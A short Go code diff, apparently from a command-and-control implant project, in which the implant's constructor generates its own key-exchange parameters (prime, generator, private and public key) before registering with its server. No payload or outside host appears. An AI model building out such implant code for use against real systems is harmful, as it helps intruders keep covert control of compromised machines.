@@ -54,10 +54,17 @@ type Implant struct {
 
 // NewImplant instantiates an Implant, registers it, and wires up its communicator.
 func NewImplant() (*Implant, error) {
+	// implant generates p, g, secret key, and public key
+	c := NewCryptoConfig()
+	c.generatePrime()
+	c.generateGenerator()
+	c.generatePrivateKey()
+	c.calculatePublicKey()
+
 	impl := &Implant{
 		SystemInfo:   GetSystemInfo(),
 		TaskQueue:    NewTaskQueue(),
-		CryptoConfig: NewCryptoConfig(),
+		CryptoConfig: c,
 	}
 
 	protocol, err := impl.register()
